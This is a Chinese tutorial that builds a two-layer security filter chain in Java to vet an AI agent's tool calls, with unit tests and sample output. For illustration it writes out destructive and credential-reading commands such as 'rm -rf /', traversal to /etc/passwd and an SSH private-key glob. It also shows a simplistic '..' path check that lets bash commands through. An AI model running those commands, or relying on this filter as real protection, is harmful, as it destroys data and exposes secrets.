# 安全沙箱入门：5层防护保护AI Agent

> **深度系列 | 第4篇** | Level 1 入门
>
> 本篇目标：从零理解AI Agent的安全沙箱机制，用责任链模式搭建一个2层安全过滤器，跑通完整的"检查-放行/拒绝"流程。

---

## 一、项目背景：为什么AI Agent需要安全沙箱？

### 1.1 一个真实的场景

假设你写了一个AI助手，它可以执行bash命令、读写文件、访问网络。然后你对它说：

> "帮我清理一下项目目录里的临时文件。"

AI正确理解了你的意图，调用 `bash("rm -rf target/")`，一切正常。

但如果它理解错了呢？

> "帮我清理一下系统里的临时文件。"

AI可能调用 `bash("rm -rf /tmp")`——这没问题。但如果它执行了 `bash("rm -rf /")`？那你的整个系统就没了。

这不是AI"变坏了"，而是AI"理解错了"。LLM（大语言模型）本质上是一个文本生成器，它根据上下文预测最可能的回答。它可能：
- 产生幻觉，编造出不存在但听起来合理的命令
- 被Prompt注入攻击，用户输入中隐藏了恶意指令
- 对工具参数理解偏差，把"清理项目目录"误解为"清理根目录"

**这就是 `mewpaw-code` 项目引入安全沙箱的原因。**

### 1.2 mewpaw-code的AI Agent架构

mewpaw-code 是一个Spring Boot + React + LangChain4j的AI Agent项目。它的核心是——让LLM能够调用工具（Tool）：执行bash命令、读写文件、搜索代码等。

但LLM调用工具的能力越强，潜在风险就越大。于是项目设计了一个**5层安全沙箱（Security Sandbox）**，在LLM的"思考"和"执行"之间加了一道安全屏障。

```
用户输入 → LLM思考 → 决定调用工具 → 安全沙箱检查 → 通过 → 执行工具
                                        ↓
                                      拒绝 → 返回错误信息
```

这个安全沙箱不是防黑客的——它是防LLM"犯错的"。就像给一个能力强但判断力差的新员工配了一个"安全监督员"。它要解决五类问题：

| 问题 | 例子 | 后果 |
|------|------|------|
| 工具幻觉 | LLM调用不存在的 `delete_everything` | 执行失败 |
| 路径遍历 | `read_file(../../etc/passwd)` | 读取敏感文件 |
| 危险命令 | `rm -rf /`、`shutdown` | 系统损坏 |
| 无痕操作 | 高危操作用户不知情 | 意外破坏 |
| 无从追溯 | 操作后没有日志 | 找不到问题根因 |

**核心思想：LLM可以做任何事，但每件事都在安全沙箱的监控之下。**

---

## 二、核心概念：安全沙箱和它的设计模式

### 2.1 什么是安全沙箱？

"沙箱"（Sandbox）是一个计算机安全术语，字面意思是"沙箱里的沙子"——孩子可以在沙箱里自由玩耍，但不能出去捣乱。

在AI Agent的语境中，**安全沙箱**是一个安全检查层，LLM的每一个工具调用都经过它审批：

```
LLM说："我想执行 bash('rm -rf /')"
安全沙箱说："检查未通过，拒绝执行，原因：危险命令"
LLM说："我想执行 bash('ls -la')"
安全沙箱说："检查通过，可以执行"
```

安全沙箱不阻止LLM思考和决策，只阻止"危险的操作"。

### 2.2 责任链模式（Chain of Responsibility）

mewpaw-code的安全沙箱使用**责任链模式**（Chain of Responsibility）实现。这是GoF设计模式之一，核心思想很简单：

**把多个检查器排成一串，每个检查器只检查自己的事，通过就传给下一个，拒绝就立即终止。**

```
请求进入 → 检查器1 → 通过 → 检查器2 → 通过 → 检查器3 → 通过 → 执行
                    ↓                      ↓
                  拒绝                   拒绝
                  (终止)                 (终止)
```

生活中的例子：**机场安检**。

```
乘客 → 身份验证 → 通过 → 行李扫描 → 通过 → 登机口检票 → 登机
          ↓                    ↓
        拒绝                 拒绝
       (无法登机)           (无法登机)
```

每个环节只关心自己的事：
- 身份验证只检查证件是否有效
- 行李扫描只检查是否携带违禁品
- 登机口只检查登机牌

在mewpaw-code中，道理完全一样：

```
工具调用 → ToolFilter → 通过 → PathGuardFilter → 通过 → CommandScannerFilter → 通过 → UserConfirmFilter → 通过 → AuditLogFilter → 放行
             ↓(拒绝)            ↓(拒绝)               ↓(拒绝)                ↓(拒绝)               ↓(拒绝)
           终止               终止                   终止                   终止                   终止
```

### 2.3 三种决策结果

每个检查器返回一个**决策结果**，只有三种可能：

| 结果 | 含义 | 后续处理 |
|------|------|----------|
| **allow（放行）** | 安全检查通过 | 继续传给下一个检查器 |
| **deny（拒绝）** | 安全检查不通过 | 立即终止，不再执行后续检查 |
| **confirm（确认）** | 需要用户手动确认 | 挂起等待，用户同意后继续 |

这三种结果对应到生活中的例子：

- **allow**：身份证没问题，过！
- **deny**：行李箱里有管制刀具，抓起来！不能登机！
- **confirm**：带了一瓶水，需要确认——"这是你的水吗？可以喝一口吗？"确认后放行

### 2.4 我们的目标：从2层开始

mewpaw-code有5层过滤器，但让我们从最简单的情况开始：

**第1层：ToolFilter（工具过滤器）**
- 职责：检查LLM调用的工具是否在白名单中
- 防御对象：LLM幻觉，调用不存在的工具
- 例子：`delete_everything` 不在白名单中 → 拒绝

**第2层：PathGuardFilter（路径守卫过滤器）**
- 职责：检查文件操作参数是否包含路径遍历（`../`）
- 防御对象：越权读取系统文件
- 例子：`read_file(../../etc/passwd)` 包含 `..` → 拒绝

这两层已经能让你理解安全沙箱的完整工作流程。后面三层（危险命令扫描、用户确认、审计日志）是锦上添花，原理相同。

---

## 三、从零搭建：一个2层安全沙箱

接下来，我们亲手搭建一个可运行的Maven项目，实现ToolFilter和PathGuardFilter两层安全沙箱。

### 3.1 项目结构

```
sandbox-demo/
├── pom.xml
├── src/
│   └── main/
│       ├── java/com/mewcode/sandbox/
│       │   ├── SecurityResult.java      # 安全决策结果
│       │   ├── SecurityFilter.java       # 安全过滤器接口
│       │   ├── SecurityFilterChain.java  # 过滤器链
│       │   ├── ToolFilter.java           # 第1层：工具过滤器
│       │   └── PathGuardFilter.java      # 第2层：路径守卫过滤器
│       └── resources/
│           └── application.yml
└── test/
    └── java/com/mewcode/sandbox/
        └── SecuritySandboxTest.java      # 测试类
```

### 3.2 pom.xml：引入Spring Boot

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0
         https://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <!--
      父项目：Spring Boot 3.3.5
      继承它之后，我们不需要自己管理依赖版本
      spring-boot-starter 会自动引入 Tomcat、Logback 等
    -->
    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>3.3.5</version>
        <relativePath/>
    </parent>

    <groupId>com.mewcode</groupId>
    <artifactId>sandbox-demo</artifactId>
    <version>1.0.0</version>
    <name>sandbox-demo</name>
    <description>安全沙箱入门示例：ToolFilter + PathGuardFilter 两层过滤器</description>

    <properties>
        <!-- 使用 Java 21 的新特性 -->
        <java.version>21</java.version>
    </properties>

    <dependencies>
        <!--
          Spring Boot Starter 核心依赖
          提供：IoC 容器、@Component/@Autowired 注解、日志等基础设施
          没有这个，我们的 Spring Boot 应用无法启动
        -->
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter</artifactId>
        </dependency>

        <!--
          Spring Boot 测试依赖（JUnit 5 + Mockito）
          scope=test 表示只在测试时使用，不会打包到生产环境
        -->
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-test</artifactId>
            <scope>test</scope>
        </dependency>
    </dependencies>

    <build>
        <plugins>
            <!--
              Spring Boot Maven 插件
              作用：把项目打包成可执行的 fat JAR（包含所有依赖）
              运行命令：java -jar target/sandbox-demo-1.0.0.jar
            -->
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
            </plugin>
        </plugins>
    </build>
</project>
```

### 3.3 application.yml：Spring Boot配置

```yaml
# Spring Boot 应用配置
spring:
  application:
    name: sandbox-demo        # 应用名称，用于日志和监控

# 自定义配置：安全沙箱参数
sandbox:
  # 已注册的合法工具列表（白名单）
  # LLM 只能调用这些工具，其他工具一律拒绝
  registered-tools:
    - bash                    # 执行 shell 命令
    - read_file               # 读取文件内容
    - write_file              # 写入文件内容
    - edit_file               # 编辑文件
    - glob                    # 文件搜索
    - grep                    # 文本搜索
  # 允许的工作目录（项目根目录）
  # 文件操作只能在这个目录下进行
  work-dir: ${user.dir}
```

### 3.4 SecurityResult：安全决策结果

这是整个安全沙箱的"返回值"——每个过滤器都返回这个对象，告诉调用方"放行、拒绝还是确认"。

```java
package com.mewcode.sandbox;

/**
 * 安全决策结果 —— 每个过滤器检查后返回的对象。
 *
 * 三种结果：
 * - allow()  → 放行，继续下一层检查
 * - deny()   → 拒绝，立即终止，不再执行后续检查
 * - confirm() → 需要用户确认，挂起等待
 *
 * 使用 Java 17+ 的 record 关键字，自动生成构造方法、equals、toString。
 * record 是不可变的，创建后就不能修改了。
 */
public record SecurityResult(
        boolean allowed,       // true=放行，false=拒绝
        boolean needsConfirm,  // true=需要用户确认
        String reason          // 拒绝或确认的原因说明
) {

    /**
     * 放行结果：安全检查通过，可以继续执行。
     * allowed=true, needsConfirm=false, reason=null
     */
    public static SecurityResult allow() {
        // 放行时不需要原因，reason 传 null
        return new SecurityResult(true, false, null);
    }

    /**
     * 拒绝结果：安全检查不通过，立即终止。
     * allowed=false, needsConfirm=false, reason=原因说明
     *
     * @param reason 拒绝原因（必填），例如 "Unknown tool: dangerous_tool"
     */
    public static SecurityResult deny(String reason) {
        // 拒绝时必须有原因，方便调试和审计
        return new SecurityResult(false, false, reason);
    }

    /**
     * 确认结果：需要用户手动确认后再决定。
     * allowed=false, needsConfirm=true, reason=确认提示
     *
     * @param reason 确认提示信息，例如 "确认执行 sudo 命令？"
     */
    public static SecurityResult confirm(String reason) {
        // 等待用户确认，allowed=false 但又不是拒绝
        // 调用方看到 needsConfirm=true，会挂起等待用户输入
        return new SecurityResult(false, true, reason);
    }
}
```

**关键理解：**

`SecurityResult` 是一个 record，这是 Java 17 引入的新特性。它和普通的 class 有什么区别？

```java
// 传统写法：需要手动写构造方法、getter、equals、toString
public class SecurityResultOld {
    private final boolean allowed;
    private final String reason;
    public SecurityResultOld(boolean allowed, String reason) {
        this.allowed = allowed;
        this.reason = reason;
    }
    public boolean allowed() { return allowed; }
    public String reason() { return reason; }
    // 还要写 equals, hashCode, toString...
}

// record 写法：一行搞定，所有方法自动生成
public record SecurityResult(boolean allowed, String reason) {}
```

这就是 Java 的"语法糖"——让代码更简洁，更专注于业务逻辑。

### 3.5 SecurityFilter：安全过滤器接口

接口定义了所有过滤器的"统一合同"——每个过滤器都必须实现 `check` 方法。

```java
package com.mewcode.sandbox;

/**
 * 安全过滤器接口 —— 所有过滤器必须实现的统一合同。
 *
 * 责任链模式的核心：每个过滤器只做一件事，
 * 检查通过就传给下一个，检查不通过就返回拒绝。
 *
 * 接口的好处：
 * 1. 新增过滤器时只需实现本接口，不用改已有代码
 * 2. 所有过滤器用法一致，上层代码可以统一处理
 * 3. 测试时可以用 Mock 对象替换真实过滤器
 */
public interface SecurityFilter {

    /**
     * 执行安全检查。
     *
     * 每个过滤器实现这个方法，检查自己的关注点。
     * 检查结果有三种：
     * - SecurityResult.allow()    → 放行，继续下一层
     * - SecurityResult.deny(...)  → 拒绝，立即终止
     * - SecurityResult.confirm(...) → 需要用户确认
     *
     * @param toolName 工具名称，例如 "bash"、"read_file"
     * @param args     工具参数，JSON 格式字符串
     * @return 安全决策结果
     */
    SecurityResult check(String toolName, String args);

    /**
     * 过滤器名称，用于日志和调试。
     * 例如 "ToolFilter"、"PathGuardFilter"
     */
    String name();
}
```

### 3.6 ToolFilter：第1层——工具过滤器

这是安全沙箱的第一道防线，也是最简单的一层：检查工具是否在白名单中。

```java
package com.mewcode.sandbox;

import java.util.Set;

/**
 * 第1层过滤器：工具过滤器（ToolFilter）。
 *
 * 职责：检查 LLM 调用的工具是否在白名单中。
 * 如果 LLM 幻觉生成了一个不存在的工具，这一层会直接拒绝。
 *
 * 防御场景：
 * - LLM 幻觉调用 "delete_everything"（不存在这个工具）
 * - Prompt 注入尝试调用 "sudo"（不在白名单中）
 * - 模型理解偏差，把工具名写错了
 *
 * 设计原则：白名单机制，不在列表中的一律拒绝。
 * 安全领域的基本原则：默认拒绝（Default Deny）。
 */
public class ToolFilter implements SecurityFilter {

    // 已注册的合法工具白名单
    // 使用 Set 集合，查找效率 O(1)
    // Set.of() 创建不可变集合，运行中不能修改
    private final Set<String> registeredTools;

    /**
     * 构造工具过滤器。
     *
     * @param registeredTools 已注册的合法工具名集合
     *                        例如 Set.of("bash", "read_file", "write_file")
     */
    public ToolFilter(Set<String> registeredTools) {
        // 防御性编程：不允许为 null
        if (registeredTools == null) {
            throw new IllegalArgumentException("registeredTools must not be null");
        }
        this.registeredTools = registeredTools;
    }

    @Override
    public SecurityResult check(String toolName, String args) {
        // 第一步：检查工具名是否为 null
        // 防御性编程，防止 NullPointerException
        if (toolName == null) {
            return SecurityResult.deny("Tool name is null");
        }

        // 第二步：检查工具是否在白名单中
        // Set.contains() 底层是 HashMap，时间复杂度 O(1)
        if (!registeredTools.contains(toolName)) {
            // 工具未注册，直接拒绝
            // 返回原因中带上工具名，方便排查
            return SecurityResult.deny(
                    "Unknown tool: '" + toolName + "'. "
                    + "Registered tools: " + registeredTools);
        }

        // 工具已注册，放行
        // 注意：这里只检查"工具名是否合法"
        // 不检查"参数是否合法"——那是后面过滤器的事
        return SecurityResult.allow();
    }

    @Override
    public String name() {
        return "ToolFilter";
    }
}
```

**逐行解读：**

| 行 | 代码 | 说明 |
|----|------|------|
| 1 | `implements SecurityFilter` | 实现过滤器接口，必须实现 check 方法 |
| 2 | `Set<String> registeredTools` | 白名单集合，用 Set 是因为查找快 |
| 3 | 构造方法 | 接收白名单，不允许为 null |
| 4 | `check(toolName, args)` | 核心方法，只需要工具名，不需要参数 |
| 5 | `contains(toolName)` | Set 的 O(1) 查找，判断是否在白名单中 |
| 6 | `deny("Unknown tool...")` | 拒绝时附带原因，包含已注册的工具列表 |
| 7 | `allow()` | 通过，继续下一层 |

### 3.7 PathGuardFilter：第2层——路径守卫过滤器

这是第二道防线，检查文件操作参数中是否包含路径遍历攻击。

```java
package com.mewcode.sandbox;

/**
 * 第2层过滤器：路径守卫过滤器（PathGuardFilter）。
 *
 * 职责：检查文件类工具的参数中是否包含路径遍历（../）。
 * 路径遍历是一种常见的安全漏洞，攻击者用 ../ 跳出工作目录。
 *
 * 防御场景：
 * - read_file("../../etc/passwd") → 尝试读取系统密码文件
 * - write_file("../../etc/cron.d/evil", "恶意内容") → 写定时任务
 * - glob("../../home/*/.ssh/id_rsa") → 窃取 SSH 私钥
 *
 * 工作原理：
 * 1. 只检查文件类工具（bash 不检查，因为 bash 的参数是命令不是路径）
 * 2. 从参数 JSON 中提取路径字段
 * 3. 检查路径是否包含 ".." 片段
 * 4. 如果包含，拒绝；否则放行
 */
public class PathGuardFilter implements SecurityFilter {

    // 文件类工具集合：只有这些工具的参数需要检查路径
    // 其他工具（如 bash）的参数是命令，不是路径，跳过检查
    private static final java.util.Set<String> FILE_TOOLS = java.util.Set.of(
            "read_file",    // 读取文件：参数 {"path": "..."}
            "write_file",   // 写入文件：参数 {"path": "...", "content": "..."}
            "edit_file",    // 编辑文件：参数 {"path": "...", "old": "...", "new": "..."}
            "glob",         // 文件搜索：参数 {"pattern": "..."}
            "grep"          // 文本搜索：参数 {"pattern": "...", "path": "..."}
    );

    @Override
    public SecurityResult check(String toolName, String args) {
        // 第一步：只检查文件类工具
        // 非文件类工具（如 bash）不检查路径，直接放行
        if (!FILE_TOOLS.contains(toolName)) {
            return SecurityResult.allow();
        }

        // 第二步：参数为空时放行
        // 没有参数就没有路径可以遍历
        if (args == null || args.isBlank()) {
            return SecurityResult.allow();
        }

        // 第三步：从参数中提取路径
        // 参数是 JSON 格式，例如 {"path": "../../etc/passwd"}
        // 我们简单搜索 "path": 后面的值，不做完整 JSON 解析
        // 后续文章会介绍用 Jackson 做完整 JSON 解析
        String path = extractPath(args);
        if (path == null) {
            // 没有路径字段，放行
            return SecurityResult.allow();
        }

        // 第四步：检查路径是否包含 ".."
        // ".." 表示上一级目录，在路径中出现意味着可能越权
        // 例如：../../etc/passwd → 跳出工作目录，访问系统文件
        if (path.contains("..")) {
            // 拒绝路径遍历
            return SecurityResult.deny(
                    "Path traversal detected: '" + path + "'. "
                    + "Access to parent directories is not allowed.");
        }

        // 路径检查通过，放行
        return SecurityResult.allow();
    }

    /**
     * 从工具参数中提取路径字段。
     *
     * 这是一个简化版实现，通过字符串搜索找到 "path" 字段的值。
     * 真实项目中应该用 Jackson 或 Gson 做 JSON 解析。
     *
     * 支持两种格式：
     * - {"path": "src/main/java/App.java"}  → 返回 "src/main/java/App.java"
     * - {"pattern": "*.java", "path": "src/"} → 返回 "src/"
     *
     * @param args 工具参数 JSON 字符串
     * @return 提取到的路径，没有 path 字段则返回 null
     */
    private String extractPath(String args) {
        // 查找 "path": 出现的位置
        // 注意：这里匹配的是 "path": 而不是 path，避免误匹配
        int pathKeyIndex = args.indexOf("\"path\"");
        if (pathKeyIndex == -1) {
            return null; // 没有 path 字段
        }

        // 找到 "path": 后面的第一个 "（值开始）
        // 跳过 "path": 这段字符，找到冒号后面的引号
        int valueStart = args.indexOf("\"", pathKeyIndex + 7);
        if (valueStart == -1) {
            return null; // 格式错误，没有值
        }

        // 找到值结束的 "（第二个引号）
        int valueEnd = args.indexOf("\"", valueStart + 1);
        if (valueEnd == -1) {
            return null; // 格式错误，引号未闭合
        }

        // 提取路径值（不包含引号）
        return args.substring(valueStart + 1, valueEnd);
    }

    @Override
    public String name() {
        return "PathGuardFilter";
    }
}
```

**逐行解读：**

| 行 | 代码 | 说明 |
|----|------|------|
| 1 | `FILE_TOOLS` | 文件类工具集合，只有这些工具需要路径检查 |
| 2 | `!FILE_TOOLS.contains(toolName)` | 非文件工具直接放行 |
| 3 | `extractPath(args)` | 手动从JSON中提取路径（简化版） |
| 4 | `path.contains("..")` | 核心检查：是否包含路径遍历 |
| 5 | `deny("Path traversal...")` | 拒绝时说明具体路径 |

**为什么用 `contains("..")` 而不是 `startsWith("../")`？**

因为路径遍历可以出现在路径的任何位置：
- `../../etc/passwd` → 开头
- `data/../../etc/passwd` → 中间
- `.../.../.../etc/passwd` → 多个点

所以用 `contains("..")` 是最简单也最安全的检查方式。

### 3.8 SecurityFilterChain：组装过滤器链

现在我们有过滤器了，但需要一个"容器"来管理它们——按顺序执行、遇到拒绝就终止。

```java
package com.mewcode.sandbox;

import java.util.ArrayList;
import java.util.List;

/**
 * 安全过滤器链 —— 责任链模式的容器。
 *
 * 职责：
 * 1. 按顺序注册过滤器
 * 2. 按顺序执行所有过滤器
 * 3. 遇到拒绝（deny）立即终止，不执行后续过滤器
 * 4. 遇到确认（confirm）挂起等待用户确认
 * 5. 全部通过后返回放行
 *
 * 使用方式：
 *   SecurityFilterChain chain = new SecurityFilterChain();
 *   chain.addFilter(new ToolFilter(registeredTools));
 *   chain.addFilter(new PathGuardFilter());
 *   SecurityResult result = chain.check("bash", "ls -la");
 */
public class SecurityFilterChain {

    // 过滤器列表：按添加顺序存储
    // ArrayList 保证有序，支持快速遍历
    private final List<SecurityFilter> filters = new ArrayList<>();

    /**
     * 注册过滤器到链中。
     *
     * 过滤器按添加顺序执行，先添加的先执行。
     * 在 mewpaw-code 中，顺序固定为：
     * 1. ToolFilter（工具检查）
     * 2. PathGuardFilter（路径检查）
     * 3. CommandScannerFilter（命令扫描）
     * 4. UserConfirmFilter（用户确认）
     * 5. AuditLogFilter（审计日志）
     *
     * @param filter 要添加的过滤器（不能为 null）
     */
    public void addFilter(SecurityFilter filter) {
        // 防御性编程
        if (filter == null) {
            throw new IllegalArgumentException("Filter must not be null");
        }
        // 追加到链尾
        filters.add(filter);
    }

    /**
     * 执行安全检查。
     *
     * 遍历所有过滤器，按顺序执行 check 方法：
     * - allow()    → 继续下一层
     * - deny()     → 立即返回，不再执行后续层
     * - confirm()  → 等待用户确认后继续
     *
     * @param toolName 工具名称
     * @param args     工具参数
     * @return 安全决策结果。全部通过返回 allow()，否则返回第一个拒绝结果
     */
    public SecurityResult check(String toolName, String args) {
        // 遍历所有过滤器，按注册顺序执行
        for (SecurityFilter filter : filters) {
            // 打印当前检查的过滤器名称，方便调试
            System.out.println("[安全检查] " + filter.name() + " 正在检查...");

            // 执行当前过滤器的检查
            SecurityResult result = filter.check(toolName, args);

            if (result.needsConfirm()) {
                // 需要用户确认
                // 真实项目中这里会展示确认对话框，等待用户输入 y/n
                // 本例简化处理：打印确认信息，模拟用户确认
                System.out.println("[安全检查] " + filter.name()
                        + " 需要确认: " + result.reason());
                System.out.println("[安全检查] 模拟用户确认通过...");
                // 确认通过，继续下一层
                continue;
            }

            if (!result.allowed()) {
                // 检查不通过，拒绝执行
                // 打印拒绝原因，方便调试
                System.out.println("[安全检查] " + filter.name()
                        + " 拒绝: " + result.reason());
                // 直接返回拒绝结果，不再执行后续过滤器
                return result;
            }

            // 检查通过，打印放行信息
            System.out.println("[安全检查] " + filter.name() + " 通过");
        }

        // 所有过滤器都通过了，放行
        System.out.println("[安全检查] 全部通过，放行执行");
        return SecurityResult.allow();
    }

    /**
     * 获取已注册的过滤器数量。
     * 用于验证链是否正确组装。
     */
    public int filterCount() {
        return filters.size();
    }

    /**
     * 获取所有过滤器的名称列表。
     * 用于调试和日志记录。
     */
    public List<String> filterNames() {
        // 把每个过滤器的 name() 收集成列表
        List<String> names = new ArrayList<>();
        for (SecurityFilter filter : filters) {
            names.add(filter.name());
        }
        return names;
    }
}
```

**关键逻辑（check 方法）：**

```
遍历过滤器列表：
  ├─ 调用 filter.check(toolName, args)
  ├─ 如果 result.needsConfirm() == true → 等待确认，继续
  ├─ 如果 result.allowed() == false → 立即返回拒绝
  └─ 如果 result.allowed() == true → 继续下一层
全部通过 → 返回 allow()
```

### 3.9 测试类：验证安全沙箱

测试是最有说服力的——看代码到底能不能跑。

```java
package com.mewcode.sandbox;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import java.util.Set;

import static org.junit.jupiter.api.Assertions.*;

/**
 * 安全沙箱单元测试 —— 验证2层过滤器链的拦截行为。
 *
 * 测试覆盖：
 * 1. 合法工具 + 安全路径 → 应放行
 * 2. 未注册工具 → 应被 ToolFilter 拒绝
 * 3. 路径遍历参数 → 应被 PathGuardFilter 拒绝
 * 4. 非文件工具不检查路径 → 应放行
 * 5. 完整链路验证
 */
class SecuritySandboxTest {

    // 过滤器链：测试的"被测对象"
    private SecurityFilterChain chain;

    /**
     * 每个测试方法执行前都会运行此方法。
     * 作用：初始化过滤器链，确保每个测试都在"干净"的环境下运行。
     */
    @BeforeEach
    void setUp() {
        // 创建过滤器链
        chain = new SecurityFilterChain();

        // 第1层：工具过滤器
        // 只允许两个工具：bash 和 read_file
        Set<String> registeredTools = Set.of("bash", "read_file");
        chain.addFilter(new ToolFilter(registeredTools));

        // 第2层：路径守卫过滤器
        // 检查文件工具的参数是否包含路径遍历
        chain.addFilter(new PathGuardFilter());
    }

    @Test
    @DisplayName("合法工具 + 安全参数 → 应放行")
    void legalToolAndSafeArgsShouldPass() {
        // 测试场景：bash 是已注册工具，参数不包含路径遍历
        // 预期：两层检查都通过，最终返回 allow()
        SecurityResult result = chain.check("bash", "ls -la");

        // 断言：allowed 为 true
        assertTrue(result.allowed(),
                "合法工具和安全参数应被放行");
        // 放行时 reason 应为 null
        assertNull(result.reason(),
                "放行时不应有拒绝原因");
    }

    @Test
    @DisplayName("未注册工具 → 应被 ToolFilter 拒绝")
    void unregisteredToolShouldBeBlocked() {
        // 测试场景：dangerous_tool 不在白名单中
        // 预期：第1层 ToolFilter 拒绝，不进入第2层
        SecurityResult result = chain.check("dangerous_tool", "anything");

        // 断言：allowed 为 false
        assertFalse(result.allowed(),
                "未注册工具应被拒绝");
        // 拒绝原因应包含工具名
        assertTrue(result.reason().contains("dangerous_tool"),
                "拒绝原因应包含被拒绝的工具名");
        // 拒绝原因应提到"Unknown tool"
        assertTrue(result.reason().contains("Unknown tool"),
                "拒绝原因应包含 'Unknown tool' 提示");
    }

    @Test
    @DisplayName("read_file 包含路径遍历 → 应被 PathGuardFilter 拒绝")
    void pathTraversalShouldBeBlocked() {
        // 测试场景：read_file 是已注册工具，但参数包含 ../ 路径遍历
        // 第1层 ToolFilter：通过（read_file 在白名单中）
        // 第2层 PathGuardFilter：拒绝（参数包含 ..）
        SecurityResult result = chain.check(
                "read_file",
                "{\"path\": \"../../etc/passwd\"}");

        // 断言：allowed 为 false
        assertFalse(result.allowed(),
                "路径遍历应被拒绝");
        // 拒绝原因应包含 "Path traversal"
        assertTrue(result.reason().contains("Path traversal"),
                "拒绝原因应包含 'Path traversal' 提示");
        // 拒绝原因应包含具体的路径
        assertTrue(result.reason().contains("../../etc/passwd"),
                "拒绝原因应包含具体的路径");
    }

    @Test
    @DisplayName("bash 即使包含路径遍历也不检查 → 应放行")
    void bashToolShouldSkipPathCheck() {
        // 测试场景：bash 不是文件工具，PathGuardFilter 不检查
        // 第1层 ToolFilter：通过（bash 在白名单中）
        // 第2层 PathGuardFilter：放行（bash 不是文件工具，跳过检查）
        SecurityResult result = chain.check(
                "bash",
                "cat ../../etc/passwd");

        // 断言：bash 的参数不检查路径，应放行
        // 这是一个设计权衡：bash 的参数是命令，不是路径
        // 路径检查只对文件工具（read_file 等）有意义
        assertTrue(result.allowed(),
                "bash 工具应跳过路径检查，直接放行");
    }

    @Test
    @DisplayName("read_file 安全路径 → 应放行")
    void safePathShouldPass() {
        // 测试场景：read_file 是已注册工具，路径是安全的工作目录内部文件
        // 第1层 ToolFilter：通过
        // 第2层 PathGuardFilter：通过（不包含 ..）
        SecurityResult result = chain.check(
                "read_file",
                "{\"path\": \"src/main/java/App.java\"}");

        // 断言：安全路径应放行
        assertTrue(result.allowed(),
                "安全路径应被放行");
    }

    @Test
    @DisplayName("read_file 无路径参数 → 应放行")
    void readFileWithoutPathShouldPass() {
        // 测试场景：read_file 的参数中没有 path 字段
        // 第1层 ToolFilter：通过
        // 第2层 PathGuardFilter：通过（没有路径可检查）
        SecurityResult result = chain.check(
                "read_file",
                "{}");

        // 断言：无路径参数时应放行
        assertTrue(result.allowed(),
                "无路径参数时应放行");
    }

    @Test
    @DisplayName("过滤器链包含2层过滤器")
    void chainShouldHaveTwoFilters() {
        // 验证：setUp 中注册了2个过滤器
        assertEquals(2, chain.filterCount(),
                "过滤器链应包含2层过滤器");
        // 验证过滤器名称
        assertEquals("ToolFilter", chain.filterNames().get(0),
                "第1层应为 ToolFilter");
        assertEquals("PathGuardFilter", chain.filterNames().get(1),
                "第2层应为 PathGuardFilter");
    }
}
```

---

## 四、运行验证：看安全沙箱如何工作

### 4.1 运行测试

打开命令行，进入项目目录，执行：

```bash
# 进入项目目录
cd sandbox-demo

# 运行所有测试
mvn test

# 或者只运行安全沙箱的测试
mvn test -Dtest=SecuritySandboxTest
```

### 4.2 预期输出

```
[INFO] Running com.mewcode.sandbox.SecuritySandboxTest

[安全检查] ToolFilter 正在检查...
[安全检查] ToolFilter 通过
[安全检查] PathGuardFilter 正在检查...
[安全检查] PathGuardFilter 通过
[安全检查] 全部通过，放行执行

[安全检查] ToolFilter 正在检查...
[安全检查] ToolFilter 拒绝: Unknown tool: 'dangerous_tool'. ...
[安全检查] ToolFilter 正在检查...
[安全检查] ToolFilter 通过
[安全检查] PathGuardFilter 正在检查...
[安全检查] PathGuardFilter 拒绝: Path traversal detected: '../../etc/passwd'. ...

...（更多测试输出）

[INFO] Tests run: 7, Failures: 0, Errors: 0, Skipped: 0
[INFO] BUILD SUCCESS
```

如果看到 `BUILD SUCCESS` 和 `Tests run: 7, Failures: 0`，说明安全沙箱工作正常。

### 4.3 手动测试验证

你也可以写一个简单的 main 方法来手动测试：

```java
package com.mewcode.sandbox;

import java.util.Set;

/**
 * 手动测试：在 IDE 中直接运行，观察安全检查流程。
 */
public class SandboxManualTest {

    public static void main(String[] args) {
        // 1. 创建过滤器链
        SecurityFilterChain chain = new SecurityFilterChain();
        chain.addFilter(new ToolFilter(Set.of("bash", "read_file")));
        chain.addFilter(new PathGuardFilter());

        System.out.println("=== 测试1：合法调用 ===");
        SecurityResult r1 = chain.check("bash", "ls -la");
        System.out.println("结果: " + (r1.allowed() ? "放行" : "拒绝") + "\n");

        System.out.println("=== 测试2：未注册工具 ===");
        SecurityResult r2 = chain.check("delete_everything", "{}");
        System.out.println("结果: " + (r2.allowed() ? "放行" : "拒绝") + " | 原因: " + r2.reason() + "\n");

        System.out.println("=== 测试3：路径遍历 ===");
        SecurityResult r3 = chain.check("read_file", "{\"path\": \"../../etc/passwd\"}");
        System.out.println("结果: " + (r3.allowed() ? "放行" : "拒绝") + " | 原因: " + r3.reason() + "\n");

        System.out.println("=== 测试4：安全路径 ===");
        SecurityResult r4 = chain.check("read_file", "{\"path\": \"src/main/java/App.java\"}");
        System.out.println("结果: " + (r4.allowed() ? "放行" : "拒绝"));
    }
}
```

运行输出：

```
=== 测试1：合法调用 ===
[安全检查] ToolFilter 正在检查...
[安全检查] ToolFilter 通过
[安全检查] PathGuardFilter 正在检查...
[安全检查] PathGuardFilter 通过
[安全检查] 全部通过，放行执行
结果: 放行

=== 测试2：未注册工具 ===
[安全检查] ToolFilter 正在检查...
[安全检查] ToolFilter 拒绝: Unknown tool: 'delete_everything'. ...
结果: 拒绝 | 原因: Unknown tool: 'delete_everything'. ...

=== 测试3：路径遍历 ===
[安全检查] ToolFilter 正在检查...
[安全检查] ToolFilter 通过
[安全检查] PathGuardFilter 正在检查...
[安全检查] PathGuardFilter 拒绝: Path traversal detected: '../../etc/passwd'. ...
结果: 拒绝 | 原因: Path traversal detected: '../../etc/passwd'. ...

=== 测试4：安全路径 ===
[安全检查] ToolFilter 正在检查...
[安全检查] ToolFilter 通过
